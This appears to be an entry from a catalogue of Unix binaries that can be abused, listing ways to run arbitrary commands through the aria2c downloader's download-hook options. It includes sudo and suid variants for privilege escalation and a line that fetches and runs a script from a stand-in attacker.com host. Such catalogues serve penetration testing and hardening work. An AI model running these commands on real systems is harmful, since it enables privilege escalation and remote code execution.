---
description: Note that the subprocess is immediately sent to the background.
functions:
  execute-non-interactive:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        aria2c --on-download-error=$TF http://x
    - description: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed.
      code: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
  suid-enabled:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        ./aria2c --on-download-error=$TF http://x
  sudo-enabled:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo aria2c --on-download-error=$TF http://x
---
